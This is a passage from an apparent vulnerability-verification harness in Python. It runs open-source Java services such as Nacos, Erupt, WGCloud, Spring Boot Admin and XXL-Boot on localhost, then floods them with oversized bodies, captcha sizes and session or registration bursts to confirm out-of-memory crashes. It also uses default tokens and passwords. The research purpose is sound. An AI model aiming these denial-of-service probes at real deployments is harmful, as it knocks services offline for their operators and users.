                "",
            ]
        ),
        encoding="utf-8",
    )
    (home / "log4j2.xml").write_text(
        """<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="WARN">
  <Appenders>
    <Console name="Console" target="SYSTEM_OUT">
      <PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} - %msg%n"/>
    </Console>
  </Appenders>
  <Loggers>
    <Root level="INFO"><AppenderRef ref="Console"/></Root>
  </Loggers>
</Configuration>
""",
        encoding="utf-8",
    )
    return home


def start_jmqtt(case: Candidate, heap: str, port: int, mysql_port: int) -> tuple[subprocess.Popen[bytes], object, Path]:
    home = jmqtt_runtime_home(port, mysql_port)
    command = p0.spring_boot_command(
        heap,
        jmqtt_classpath(),
        "org.jmqtt.broker.BrokerStartup",
        "-h",
        home.as_posix(),
        "-l",
        "INFO",
        java_preferred=("java-17-openjdk", "java-21-openjdk", "java-22-openjdk"),
    )
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    process, handle = p0.start_java(command, log_path, JMQTT_DIR)
    deadline = time.monotonic() + 90
    while time.monotonic() < deadline:
        if process.poll() is not None:
            break
        if wait_for_host_port("127.0.0.1", port, 0.5):
            return process, handle, log_path
        time.sleep(0.25)
    p0.stop_process(process, handle)
    raise RuntimeError(f"JMQTT did not accept MQTT TCP on port {port}; see {rel(log_path)}")


def start_socket_mqtt(case: Candidate, heap: str, port: int) -> tuple[subprocess.Popen[bytes], object, Path]:
    # The upstream sample main binds to 8000. Keep one isolated run at the sample default port.
    if port != 8000:
        raise RuntimeError("socket-mqtt sample main only supports its default port 8000 without source changes")
    command = p0.spring_boot_command(
        heap,
        socket_mqtt_classpath(),
        "com.yb.socket.service.mqtt.MqttServerTest",
        java_preferred=("java-17-openjdk", "java-21-openjdk", "java-22-openjdk"),
    )
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    process, handle = p0.start_java(command, log_path, SOCKET_MQTT_DIR)
    if not wait_for_host_port("127.0.0.1", port, 60):
        p0.stop_process(process, handle)
        raise RuntimeError(f"socket-mqtt sample did not accept MQTT TCP on port {port}; see {rel(log_path)}")
    return process, handle, log_path


def mqtt_publish_qos(sock: socket.socket, topic: str, payload: bytes, qos: int, packet_id: int, retain: bool = False) -> None:
    flags = (0x01 if retain else 0x00) | (qos << 1)
    variable = p0.mqtt_string(topic)
    if qos:
        variable += packet_id.to_bytes(2, "big")
    sock.sendall(p0.mqtt_packet(0x30 | flags, variable + payload))


def make_large_json_payload(key: str, size: int) -> bytes:
    return json.dumps({key: "A" * size}).encode("utf-8")


def run_http_body_burst(
    case: Candidate,
    process,
    handle,
    log_path: Path,
    port: int,
    endpoint: str,
    payload: bytes,
    heap: str,
    *,
    method: str = "POST",
    content_type: str = "application/json",
    workers: int = 8,
    loops: int = 30,
    timeout: float = 25,
    extra_headers: dict[str, str] | None = None,
    extra_evidence: dict[str, object] | None = None,
    notes: str = "",
) -> ProbeResult:
    sent = 0
    last_status = 0
    client_exception = ""
    lock = threading.Lock()

    def worker(worker_id: int) -> None:
        nonlocal sent, last_status, client_exception
        for index in range(loops):
            if process.poll() is not None or p0.oom_signal(log_path):
                return
            headers = {
                "Content-Type": content_type,
                "User-Agent": f"p1-body/{case.candidate_id}/{worker_id}/{index}",
                **(extra_headers or {}),
            }
            try:
                status, body, _ = p0.http_request(
                    f"http://127.0.0.1:{port}{endpoint}",
                    method=method,
                    data=payload,
                    headers=headers,
                    timeout=timeout,
                )
                with lock:
                    sent += 1
                    last_status = status
                if status >= 500 and b"OutOfMemoryError" in body:
                    return
            except (urllib.error.URLError, TimeoutError, OSError, http.client.HTTPException) as exc:
                with lock:
                    client_exception = repr(exc)
                return

    threads = [threading.Thread(target=worker, args=(worker_id,), daemon=True) for worker_id in range(workers)]
    for thread in threads:
        thread.start()
    deadline = time.monotonic() + 180
    while time.monotonic() < deadline:
        if process.poll() is not None or p0.oom_signal(log_path):
            break
        if all(not thread.is_alive() for thread in threads):
            break
        time.sleep(0.5)
    for thread in threads:
        thread.join(timeout=2)
    return finish_probe(
        case,
        process,
        handle,
        log_path,
        sent,
        {
            "heap": heap,
            "port": port,
            "endpoint": endpoint,
            "payloadBytes": len(payload),
            "workerThreads": workers,
            "loopsPerWorker": loops,
            **(extra_evidence or {}),
            "lastHttpStatus": last_status,
            "clientException": client_exception,
            "postProbePortOpen": p0.port_open(port),
        },
        notes=notes,
    )


def run_fresh_cookie_get_burst(
    case: Candidate,
    process,
    handle,
    log_path: Path,
    port: int,
    path_builder: Callable[[int], str],
    heap: str,
    *,
    workers: int = 8,
    max_requests: int = 100000,
    timeout: float = 8,
    headers_builder: Callable[[int], dict[str, str]] | None = None,
    notes: str = "",
) -> ProbeResult:
    sent = 0
    last_status = 0
    set_cookie_count = 0
    client_exception = ""
    next_index = 0
    lock = threading.Lock()

    def worker(worker_id: int) -> None:
        nonlocal sent, last_status, set_cookie_count, client_exception, next_index
        while True:
            with lock:
                next_index += 1
                index = next_index
            if index > max_requests or process.poll() is not None or p0.oom_signal(log_path):
                return
            headers = {
                "User-Agent": f"p1-fresh/{case.candidate_id}/{worker_id}/{index}",
                "Connection": "close",
            }
            if headers_builder is not None:
                headers.update(headers_builder(index))
            try:
                status, _, response_headers = p0.http_request(
                    f"http://127.0.0.1:{port}{path_builder(index)}",
                    headers=headers,
                    timeout=timeout,
                )
                with lock:
                    sent += 1
                    last_status = status
                    if "Set-Cookie" in response_headers:
                        set_cookie_count += 1
            except (urllib.error.URLError, TimeoutError, OSError, http.client.HTTPException) as exc:
                with lock:
                    client_exception = repr(exc)
                return
            if index % 500 == 0:
                time.sleep(0.005)

    threads = [threading.Thread(target=worker, args=(worker_id,), daemon=True) for worker_id in range(workers)]
    for thread in threads:
        thread.start()
    deadline = time.monotonic() + 240
    while time.monotonic() < deadline:
        if process.poll() is not None or p0.oom_signal(log_path):
            break
        if all(not thread.is_alive() for thread in threads):
            break
        time.sleep(0.5)
    for thread in threads:
        thread.join(timeout=2)
    return finish_probe(
        case,
        process,
        handle,
        log_path,
        sent,
        {
            "heap": heap,
            "port": port,
            "workerThreads": workers,
            "maxRequests": max_requests,
            "lastHttpStatus": last_status,
            "setCookieCount": set_cookie_count,
            "clientException": client_exception,
            "postProbePortOpen": p0.port_open(port),
        },
        notes=notes,
    )


def run_form_post_burst(
    case: Candidate,
    process,
    handle,
    log_path: Path,
    port: int,
    endpoint: str,
    form_builder: Callable[[int], dict[str, object]],
    heap: str,
    *,
    workers: int = 8,
    max_requests: int = 80000,
    timeout: float = 10,
    notes: str = "",
) -> ProbeResult:
    sent = 0
    last_status = 0
    client_exception = ""
    next_index = 0
    lock = threading.Lock()

    def worker(worker_id: int) -> None:
        nonlocal sent, last_status, client_exception, next_index
        opener = p0.new_cookie_opener()
        while True:
            with lock:
                next_index += 1
                index = next_index
            if index > max_requests or process.poll() is not None or p0.oom_signal(log_path):
                return
            try:
                status, _, _ = p0.form_request(
                    opener,
                    f"http://127.0.0.1:{port}{endpoint}",
                    form_builder(index),
                    timeout=timeout,
                )
                with lock:
                    sent += 1
                    last_status = status
            except (urllib.error.URLError, TimeoutError, OSError, http.client.HTTPException) as exc:
                with lock:
                    client_exception = repr(exc)
                return
            if index % 500 == 0:
                time.sleep(0.005)

    threads = [threading.Thread(target=worker, args=(worker_id,), daemon=True) for worker_id in range(workers)]
    for thread in threads:
        thread.start()
    deadline = time.monotonic() + 240
    while time.monotonic() < deadline:
        if process.poll() is not None or p0.oom_signal(log_path):
            break
        if all(not thread.is_alive() for thread in threads):
            break
        time.sleep(0.5)
    for thread in threads:
        thread.join(timeout=2)
    return finish_probe(
        case,
        process,
        handle,
        log_path,
        sent,
        {
            "heap": heap,
            "port": port,
            "endpoint": endpoint,
            "workerThreads": workers,
            "maxRequests": max_requests,
            "lastHttpStatus": last_status,
            "clientException": client_exception,
            "postProbePortOpen": p0.port_open(port),
        },
        notes=notes,
    )


def register_sba_instance(port: int, index: int, app_name: str = "p1-sba") -> int:
    payload = {
        "name": app_name,
        "managementUrl": f"http://127.0.0.1:9/actuator/{index}",
        "healthUrl": f"http://127.0.0.1:9/actuator/health/{index}",
        "serviceUrl": f"http://127.0.0.1:9/service/{index}",
        "metadata": {
            "p1": str(index),
            "pad": "M" * 512,
        },
    }
    status, _, _ = p0.http_request(
        f"http://127.0.0.1:{port}/instances",
        method="POST",
        data=json.dumps(payload).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        timeout=8,
    )
    return status


def run_sba_instances_registry(case: Candidate) -> ProbeResult:
    port = 18131
    heap = p0.with_min_heap("160m")
    process, handle, log_path = start_sba(case, heap, port)
    sent = 0
    last_status = 0
    client_exception = ""
    try:
        for index in range(1, 50001):
            last_status = register_sba_instance(port, index)
            sent = index
            if index % 100 == 0:
                time.sleep(0.01)
                if process.poll() is not None or p0.oom_signal(log_path):
                    break
    except (urllib.error.URLError, TimeoutError, OSError, http.client.HTTPException) as exc:
        client_exception = repr(exc)
    return finish_probe(
        case,
        process,
        handle,
        log_path,
        sent,
        {
            "heap": heap,
            "port": port,
            "endpoint": "POST /instances",
            "lastHttpStatus": last_status,
            "clientException": client_exception,
            "postProbePortOpen": p0.port_open(port),
        },
        notes="最小 insecure SBA sample，重复注册唯一 healthUrl/name metadata；未观察到 OOM 则保留为未确认。",
    )


def run_sba_application_fanout(case: Candidate) -> ProbeResult:
    port = 18133
    heap = p0.with_min_heap("160m")
    process, handle, log_path = start_sba(case, heap, port)
    sent = 0
    last_status = 0
    client_exception = ""
    try:
        for index in range(1, 6001):
            register_sba_instance(port, index, app_name="p1-fanout")
            sent += 1
            if index % 250 == 0:
                try:
                    last_status, _, _ = p0.http_request(
                        f"http://127.0.0.1:{port}/applications/p1-fanout/actuator/health",
                        headers={"Accept": "application/json"},
                        timeout=20,
                    )
                    sent += 1
                except (urllib.error.URLError, TimeoutError, OSError, http.client.HTTPException) as exc:
                    client_exception = repr(exc)
                    break
                if process.poll() is not None or p0.oom_signal(log_path):
                    break
    except (urllib.error.URLError, TimeoutError, OSError, http.client.HTTPException) as exc:
        client_exception = repr(exc)
    return finish_probe(
        case,
        process,
        handle,
        log_path,
        sent,
        {
            "heap": heap,
            "port": port,
            "seededApplicationName": "p1-fanout",
            "endpoint": "/applications/p1-fanout/actuator/health",
            "lastHttpStatus": last_status,
            "clientException": client_exception,
            "postProbePortOpen": p0.port_open(port),
        },
        notes="先注册同名实例，再触发 /applications/{name}/actuator/health fan-out；失败上游为 127.0.0.1:9。",
    )


def run_sba_sse_slow_clients(case: Candidate) -> ProbeResult:
    port = 18134
    heap = p0.with_min_heap("160m")
    process, handle, log_path = start_sba(case, heap, port)
    sockets: list[socket.socket] = []
    sent = 0
    client_exception = ""
    try:
        for index in range(80):
            sock = socket.create_connection(("127.0.0.1", port), timeout=5)
            sock.sendall(
                b"GET /instances/events HTTP/1.1\r\n"
                b"Host: 127.0.0.1\r\n"
                b"Accept: text/event-stream\r\n"
                b"Connection: keep-alive\r\n\r\n"
            )
            sockets.append(sock)
            sent += 1
        for index in range(1, 20001):
            register_sba_instance(port, index, app_name="p1-sse")
            sent += 1
            if index % 100 == 0:
                time.sleep(0.02)
                if process.poll() is not None or p0.oom_signal(log_path):
                    break
    except (urllib.error.URLError, TimeoutError, OSError, http.client.HTTPException, socket.error) as exc:
        client_exception = repr(exc)
    finally:
        for sock in sockets:
            try:
                sock.close()
            except OSError:
                pass
    return finish_probe(
        case,
        process,
        handle,
        log_path,
        sent,
        {
            "heap": heap,
            "port": port,
            "sseSockets": len(sockets),
            "endpoint": "/instances/events",
            "clientException": client_exception,
            "postProbePortOpen": p0.port_open(port),
        },
        notes="慢读 SSE 连接配合注册事件洪泛；只有目标 JVM OOM 才提升为真阳性。",
    )


def run_erupt_captcha_height(case: Candidate) -> ProbeResult:
    port = 18141
    heap = p0.with_min_heap("128m")
    enhanced = p0.is_heap_at_least(heap, 1024)
    tested_heights = (
        (900000, 1200000, 1600000, 2000000, 2400000)
        if enhanced
        else (200000, 300000, 450000, 650000, 900000)
    )
    process, handle, log_path = start_erupt(case, heap, port)
    sent = 0
    last_status = 0
    client_exception = ""
    for height in tested_heights:
        if process.poll() is not None or p0.oom_signal(log_path):
            break
        try:
            status, body, _ = p0.http_request(
                f"http://127.0.0.1:{port}/erupt-api/code-img?mark={height}&height={height}",
                timeout=45 if enhanced else 30,
            )
            sent += 1
            last_status = status
            if status >= 500 and b"OutOfMemoryError" in body:
                break
        except (urllib.error.URLError, TimeoutError, OSError, http.client.HTTPException) as exc:
            client_exception = repr(exc)
            break
        time.sleep(0.5)
    return finish_probe(
        case,
        process,
        handle,
        log_path,
        sent,
        {
            "heap": heap,
            "port": port,
            "endpoint": "/erupt-api/code-img",
            "testedHeights": list(tested_heights),
            "enhancedProbe": enhanced,
            "lastHttpStatus": last_status,
            "clientException": client_exception,
            "postProbePortOpen": p0.port_open(port),
        },
        notes="Erupt sample 默认 H2 启动，匿名 captcha height 直接驱动 BufferedImage 分配。",
    )


def run_erupt_json_body_filter(case: Candidate) -> ProbeResult:
    port = 18142
    heap = p0.with_min_heap("128m")
    process, handle, log_path = start_erupt(case, heap, port)
    enhanced = p0.is_heap_at_least(heap, 1024)
    payload = make_large_json_payload("pad", (36 if enhanced else 10) * 1024 * 1024)
    return run_http_body_burst(
        case,
        process,
        handle,
        log_path,
        port,
        "/erupt-api/data/table/EruptUser",
        payload,
        heap,
        workers=24 if enhanced else 8,
        loops=24 if enhanced else 20,
        timeout=60 if enhanced else 25,
        extra_headers={"erupt": "EruptUser"},
        extra_evidence={
            "enhancedProbe": enhanced,
            "probeFix": "use real POST /erupt-api/data/table/{erupt} route instead of GET-only /erupt-api/login",
        },
        notes="匿名 POST /erupt-api/data/table/EruptUser JSON body 先经过 operation-log filter 复制；未 OOM 则不提升。",
    )


def wgcloud_min_task_payload(items: int, pad_size: int) -> bytes:
    pad = "W" * pad_size
    app_info = [
        {
            "hostname": f"p1-host-{index}",
            "appPid": str(100000 + index),
            "appType": "1",
            "appName": f"p1-app-{index}-{pad}",
            "memPer": 1.0,
            "cpuPer": 1.0,
            "state": "1",
        }
        for index in range(items)
    ]
    app_state = [
        {
            "appInfoId": str(100000 + index),
            "cpuPer": 1.0,
            "memPer": 1.0,
            "dateStr": "06-26 22:00:00",
        }
        for index in range(items)
    ]
    body = {
        "wgToken": hashlib.md5(b"wgcloud").hexdigest(),
        "cpuState": {"hostname": "p1", "percent": 1.0, "idle": 1.0, "sys": 1.0, "user": 1.0, "ioWait": 1.0, "remark": pad},
        "memState": {"hostname": "p1", "used": 1.0, "free": 1.0, "percent": 1.0, "remark": pad},
        "sysLoadState": {"hostname": "p1", "oneLoad": "1", "fiveLoad": "1", "fifteenLoad": "1", "remark": pad},
        "netIoState": {"hostname": "p1", "name": "eth0", "rxpck": "1", "txpck": "1", "remark": pad},
        "systemInfo": {"hostname": "p1", "cpuCoreNum": 4, "version": pad, "remark": pad},
        "logInfo": {"hostname": "p1", "logPath": "/tmp/p1", "content": pad},
        "appInfoList": app_info,
        "appStateList": app_state,
        "deskStateList": [{"hostname": f"p1-{index}", "fileSystem": pad, "diskName": pad, "remark": pad} for index in range(32)],
    }
    return json.dumps(body).encode("utf-8")


def run_wgcloud_min_task(case: Candidate) -> ProbeResult:
    port = 18178
    mysql_port = 33478
    mysql_name = "p1-wgcloud-mysql"
    heap = p0.with_min_heap("160m")
    process = None
    handle = None
    try:
        mysql_image = p0.start_mysql_container(mysql_name, mysql_port, "123456", mysql_version="5.7")
        p0.mysql_import(mysql_name, "123456", "wgcloud", p0.WGCLOUD_DIR / "sql" / "wgcloud-MySQL.sql")
        process, handle, log_path = p0.start_wgcloud(p0_case(case), heap, port, mysql_port)
        payload = wgcloud_min_task_payload(3500, 1024)
        result = run_http_body_burst(
            case,
            process,
            handle,
            log_path,
            port,
            "/wgcloud/agent/minTask",
            payload,
            heap,
            workers=8,
            loops=24,
            timeout=30,
            notes="完整 WGCloud server + MySQL 默认 token，POST /agent/minTask 大数组和 BatchData 静态列表压力。",
        )
        result.evidence.update({"mysqlContainer": mysql_name, "mysqlImage": mysql_image, "mysqlPort": mysql_port})
        return result
    finally:
        if process is not None and handle is not None and process.poll() is None:
            p0.stop_process(process, handle)
        p0.docker_rm(mysql_name)


def run_rebuild_with_mysql(
    case: Candidate,
    heap: str,
    port: int,
    mysql_port: int,
    probe: Callable[[subprocess.Popen[bytes], object, Path], ProbeResult],
) -> ProbeResult:
    mysql_name = f"p1-rebuild-mysql-{port}"
    process = None
    handle = None
    try:
        mysql_image = p0.start_mysql_container(mysql_name, mysql_port, "rebuild", mysql_version="5.7")
        p0.mysql_exec(
            mysql_name,
            "rebuild",
            "CREATE DATABASE IF NOT EXISTS rebuild40 DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;\nUSE rebuild40;\n",
        )
        p0.mysql_exec(mysql_name, "rebuild", "USE rebuild40;\n" + (REBUILD_DIR / "src/main/resources/scripts/db-init.sql").read_text(encoding="utf-8", errors="replace"))
        process, handle, log_path = start_rebuild(case, heap, port, mysql_port)
        result = probe(process, handle, log_path)
        result.evidence.update({"mysqlContainer": mysql_name, "mysqlImage": mysql_image, "mysqlPort": mysql_port})
        return result
    finally:
        if process is not None and handle is not None and process.poll() is None:
            p0.stop_process(process, handle)
        p0.docker_rm(mysql_name)


def run_rebuild_session_growth(case: Candidate) -> ProbeResult:
    heap = p0.with_min_heap("128m")
    port = 18151

    def probe(process, handle, log_path: Path) -> ProbeResult:
        sent = 0
        last_status = 0
        set_cookie_count = 0
        client_exception = ""
        lock = threading.Lock()
        next_index = 0

        def worker(worker_id: int) -> None:
            nonlocal sent, last_status, set_cookie_count, client_exception, next_index
            while True:
                with lock:
                    next_index += 1
                    index = next_index
                if index > 100000 or process.poll() is not None or p0.oom_signal(log_path):
                    return
                try:
                    status, body, headers = p0.http_request(
                        f"http://127.0.0.1:{port}/user/login?p1={index}",
                        headers={"User-Agent": f"p1-rebuild-session/{worker_id}/{index}"},
                        opener=p0.new_cookie_opener(),
                        timeout=5,
                    )
                    with lock:
                        sent += 1
                        last_status = status
                        if headers.get("Set-Cookie"):
                            set_cookie_count += 1
                    if status >= 500 and b"OutOfMemoryError" in body:
                        return
                except (urllib.error.URLError, TimeoutError, OSError, http.client.HTTPException) as exc:
                    with lock:
                        client_exception = repr(exc)
                    return

        threads = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(16)]
        for thread in threads:
            thread.start()
        deadline = time.monotonic() + 240
        while time.monotonic() < deadline:
            if process.poll() is not None or p0.oom_signal(log_path) or all(not t.is_alive() for t in threads):
                break
            time.sleep(0.5)
        for thread in threads:
            thread.join(timeout=2)
        return finish_probe(
            case,
            process,
            handle,
            log_path,
            sent,
            {
                "heap": heap,
                "port": port,
                "endpoint": "/user/login",
                "setCookieResponses": set_cookie_count,
                "workerThreads": len(threads),
                "lastHttpStatus": last_status,
                "clientException": client_exception,
                "postProbePortOpen": p0.port_open(port),
            },
            notes="匿名 interceptor-covered /user/login 请求不复用 RBSESSION，测默认 Tomcat session 保留能否触发 OOM。",
        )

    return run_rebuild_with_mysql(case, heap, port, 33451, probe)


def run_rebuild_barcode_render(case: Candidate) -> ProbeResult:
    heap = p0.with_min_heap("128m")
    port = 18152

    def probe(process, handle, log_path: Path) -> ProbeResult:
        sent = 0
        last_status = 0
        client_exception = ""
        for size in (12000, 20000, 28000, 32000):
            if process.poll() is not None or p0.oom_signal(log_path):
                break
            text = "B" * size
            try:
                status, body, _ = p0.http_request(
                    f"http://127.0.0.1:{port}/commons/barcode/render?t={urllib.parse.quote(text)}&w=1200",
                    timeout=45,
                )
                sent += 1
                last_status = status
                if status >= 500 and b"OutOfMemoryError" in body:
                    break
            except (urllib.error.URLError, TimeoutError, OSError, http.client.HTTPException) as exc:
                client_exception = repr(exc)
                break
            time.sleep(0.5)
        return finish_probe(
            case,
            process,
            handle,
            log_path,
            sent,
            {
                "heap": heap,
                "port": port,
                "endpoint": "/commons/barcode/render",
                "testedTextLengths": [12000, 20000, 28000, 32000],
                "lastHttpStatus": last_status,
                "clientException": client_exception,
                "postProbePortOpen": p0.port_open(port),
            },
            notes="匿名 Code128 barcode render，文本长度受默认请求行/header 限制；成功条件仍是目标 JVM OOM。",
        )

    return run_rebuild_with_mysql(case, heap, port, 33452, probe)


def run_rebuild_api_gateway_body(case: Candidate) -> ProbeResult:
    heap = p0.with_min_heap("128m")
    port = 18153

    def probe(process, handle, log_path: Path) -> ProbeResult:
        enhanced = p0.is_heap_at_least(heap, 1024)
        payload = make_large_json_payload("pad", (24 if enhanced else 10) * 1024 * 1024)
        return run_http_body_burst(
            case,
            process,
            handle,
            log_path,
            port,
            "/gw/api/system-time?appid=bad&sign=bad",
            payload,
            heap,
            workers=10 if enhanced else 8,
            loops=30 if enhanced else 24,
            timeout=45 if enhanced else 30,
            extra_evidence={"enhancedProbe": enhanced},
            notes="匿名 /gw/api/system-time 在签名校验前读取并解析 JSON body；未 OOM 则不提升。",
        )

    return run_rebuild_with_mysql(case, heap, port, 33453, probe)


def run_rebuild_captcha_sessions(case: Candidate) -> ProbeResult:
    heap = p0.with_min_heap("128m")
    port = 18154

    def probe(process, handle, log_path: Path) -> ProbeResult:
        sent = 0
        last_status = 0
        set_cookie_count = 0
        client_exception = ""
        for index in range(1, 50001):
            if process.poll() is not None or p0.oom_signal(log_path):
                break
            try:
                status, body, headers = p0.http_request(
                    f"http://127.0.0.1:{port}/user/captcha?k=p1-{index}",
                    opener=p0.new_cookie_opener(),
                    timeout=5,
                )
                sent = index
                last_status = status
                if headers.get("Set-Cookie"):
                    set_cookie_count += 1
                if status >= 500 and b"OutOfMemoryError" in body:
                    break
            except (urllib.error.URLError, TimeoutError, OSError, http.client.HTTPException) as exc:
                client_exception = repr(exc)
                break
            if index % 100 == 0:
                time.sleep(0.01)
        return finish_probe(
            case,
            process,
            handle,
            log_path,
            sent,
            {
                "heap": heap,
                "port": port,
                "endpoint": "/user/captcha",
                "setCookieResponses": set_cookie_count,
                "lastHttpStatus": last_status,
                "clientException": client_exception,
                "postProbePortOpen": p0.port_open(port),
            },
            notes="匿名 captcha 路径不复用 RBSESSION，并旋转 k；MobKey 有界，真阳性只看目标 JVM OOM。",
        )

    return run_rebuild_with_mysql(case, heap, port, 33454, probe)


def run_xxl_boot_with_dependencies(
    case: Candidate,
    heap: str,
    port: int,
    mysql_port: int,
    redis_port: int,
    probe: Callable[[subprocess.Popen[bytes], object, Path], ProbeResult],
) -> ProbeResult:
    mysql_name = f"p1-xxl-boot-mysql-{port}"
    redis_name = f"p1-xxl-boot-redis-{port}"
    process = None
    handle = None
    try:
        mysql_image = p0.start_mysql_container(mysql_name, mysql_port, "root_pwd", mysql_version="5.7")
        p0.mysql_import(mysql_name, "root_pwd", "boot", XXL_BOOT_DIR / "xxl-boot-api" / "doc" / "tables-init.sql")
        redis_image = p0.start_redis_container(redis_name, redis_port)
        process, handle, log_path = start_xxl_boot(case, heap, port, mysql_port, redis_port)
        result = probe(process, handle, log_path)
        result.evidence.update(
            {
                "mysqlContainer": mysql_name,
                "mysqlImage": mysql_image,
                "mysqlPort": mysql_port,
                "redisContainer": redis_name,
                "redisImage": redis_image,
                "redisPort": redis_port,
            }
        )
        return result
    finally:
        if process is not None and handle is not None and process.poll() is None:
            p0.stop_process(process, handle)
        p0.docker_rm(mysql_name)
        p0.docker_rm(redis_name)


def run_xxl_boot_repeatable_body(case: Candidate) -> ProbeResult:
    heap = p0.with_min_heap("128m")
    port = 18191

    def probe(process, handle, log_path: Path) -> ProbeResult:
        enhanced = p0.is_heap_at_least(heap, 1024)
        pad_size = (24 if enhanced else 10) * 1024 * 1024
        payload = json.dumps(
            {
                "username": "admin",
                "password": "bad-password",
                "code": "",
                "uuid": "",
                "pad": "X" * pad_size,
            }
        ).encode("utf-8")
        return run_http_body_burst(
            case,
            process,
            handle,
            log_path,
            port,
            "/login",
            payload,
            heap,
            workers=10 if enhanced else 8,
            loops=30 if enhanced else 24,
            timeout=45 if enhanced else 30,
            extra_evidence={"enhancedProbe": enhanced},
            notes="XXL-Boot 默认匿名 /login JSON 经过全局 RepeatableFilter 复制请求体；captcha 未命中仍会在 body copy 后失败。",
        )

    return run_xxl_boot_with_dependencies(case, heap, port, 33491, 36491, probe)


def run_xxl_boot_login_failures(case: Candidate) -> ProbeResult:
    heap = p0.with_min_heap("160m")
    port = 18193

    def probe(process, handle, log_path: Path) -> ProbeResult:
        enhanced = p0.is_heap_at_least(heap, 1024)
        per_worker_limit = 24000 if enhanced else 12000
        sent = 0
        last_status = 0
        client_exception = ""
        lock = threading.Lock()

        def worker(worker_id: int) -> None:
            nonlocal sent, last_status, client_exception
            for index in range(1, per_worker_limit + 1):
                if process.poll() is not None or p0.oom_signal(log_path):
                    return
                sequence = worker_id * per_worker_limit + index
                payload = {
                    "username": f"p1-user-{sequence}",
                    "password": "bad-password",
                    "code": "bad",
                    "uuid": f"missing-{sequence}",
                }
                try:
                    status, body, _ = p0.http_request(
                        f"http://127.0.0.1:{port}/login",
                        method="POST",
                        data=json.dumps(payload).encode("utf-8"),
                        headers={"Content-Type": "application/json", "User-Agent": f"p1-xxl-boot-login/{worker_id}"},
                        timeout=10,
                    )
                    with lock:
                        sent += 1
                        last_status = status
                    if status >= 500 and b"OutOfMemoryError" in body:
                        return
                except (urllib.error.URLError, TimeoutError, OSError, http.client.HTTPException) as exc:
                    with lock:
                        client_exception = repr(exc)
                    return
                if index % 200 == 0:
                    time.sleep(0.005)

        threads = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(8)]
        for thread in threads:
            thread.start()
        deadline = time.monotonic() + (420 if enhanced else 240)
        while time.monotonic() < deadline:
            if process.poll() is not None or p0.oom_signal(log_path) or all(not thread.is_alive() for thread in threads):
                break
            time.sleep(0.5)
        for thread in threads:
            thread.join(timeout=2)
        return finish_probe(
            case,
            process,
            handle,
            log_path,
            sent,
            {
                "heap": heap,
                "port": port,
                "endpoint": "/login",
                "workerThreads": len(threads),
                "perWorkerLimit": per_worker_limit,
                "enhancedProbe": enhanced,
                "lastHttpStatus": last_status,
                "clientException": client_exception,
                "postProbePortOpen": p0.port_open(port),
            },
            notes="匿名登录失败路径在默认 captcha 过期分支也会提交 AsyncFactory.recordLogininfor；仅目标 JVM OOM 才确认。",
        )

    return run_xxl_boot_with_dependencies(case, heap, port, 33493, 36493, probe)


def run_nacos_instance_registration(case: Candidate) -> ProbeResult:
    port = 18121
    heap = p0.with_min_heap("192m")
    process, handle, log_path = start_nacos(case, heap, port)
    sent = 0
    last_status = 0
    client_exception = ""
    pad = "N" * 2048
    time_limit_seconds = 240
    deadline = time.monotonic() + time_limit_seconds
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    try:
        for index in range(1, 100001):
            if time.monotonic() >= deadline:
                client_exception = "time_limit_reached"
                break
            service_name = f"p1-service-{index}"
            params = urllib.parse.urlencode(
                {
                    "serviceName": service_name,
                    "groupName": "DEFAULT_GROUP",
                    "ip": f"10.{(index // 65536) % 255}.{(index // 256) % 255}.{index % 255}",
                    "port": str(10000 + (index % 50000)),
                    "ephemeral": "false",
                    "healthy": "true",
                    "enabled": "true",
                    "metadata": json.dumps({"p1": str(index), "pad": pad}),
                }
            )
            try:
                status, body, _ = p0.http_request(
                    f"http://127.0.0.1:{port}/nacos/v1/ns/instance?{params}",
                    method="POST",
                    opener=opener,
                    timeout=10,
                )
                sent = index
                last_status = status
                if status >= 500 and b"OutOfMemoryError" in body:
                    break
            except (urllib.error.URLError, TimeoutError, OSError, http.client.HTTPException) as exc:
                client_exception = repr(exc)
                break
            if index % 250 == 0:
                time.sleep(0.01)
                if process.poll() is not None or p0.oom_signal(log_path):
                    break
    finally:
        pass
    return finish_probe(
        case,
        process,
        handle,
        log_path,
        sent,
        {
            "heap": heap,
            "port": port,
            "endpoint": "POST /nacos/v1/ns/instance",
            "ephemeral": False,
            "metadataPadBytes": len(pad),
            "timeLimitSeconds": time_limit_seconds,
            "lastHttpStatus": last_status,
            "clientException": client_exception,
            "postProbePortOpen": p0.port_open(port),
        },
        notes="Nacos standalone/auth-disabled 默认 HTTP naming API，重复注册唯一 service/instance metadata；只以目标 JVM OOM 为真阳。",
    )


def run_jmqtt_with_mysql(
    case: Candidate,
    heap: str,
    port: int,
    mysql_port: int,
    probe: Callable[[subprocess.Popen[bytes], object, Path], ProbeResult],
) -> ProbeResult:
    mysql_name = f"p1-jmqtt-mysql-{port}"
    process = None
    handle = None
    try:
        mysql_image = start_jmqtt_mysql_container(mysql_name, mysql_port)
        p0.mysql_exec(
            mysql_name,
            "CallmeZ2013",
            "CREATE DATABASE IF NOT EXISTS jmqtt DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;\nUSE jmqtt;\n",
        )
        sql_text = (JMQTT_DIR / "jmqtt-broker" / "target" / "classes" / "conf" / "jmqtt.sql").read_text(
            encoding="utf-8",
            errors="replace",
        )
        create_start = sql_text.find("CREATE TABLE")
        if create_start == -1:
            raise RuntimeError("JMQTT schema SQL did not contain CREATE TABLE statements")
        schema_sql = sql_text[create_start:]
        # Upstream SQL relies on permissive timestamp defaults; keep the
        # runtime schema import compatible with stock MySQL 5.7 containers.
        schema_sql = re.sub(r"`([^`]+)` timestamp(\(6\))? NOT NULL COMMENT", r"`\1` timestamp\2 NULL COMMENT", schema_sql)
        p0.mysql_exec(mysql_name, "CallmeZ2013", "USE jmqtt;\n" + schema_sql)
        process, handle, log_path = start_jmqtt(case, heap, port, mysql_port)
        result = probe(process, handle, log_path)
        result.evidence.update({"mysqlContainer": mysql_name, "mysqlImage": mysql_image, "mysqlPort": mysql_port})
        return result
    finally:
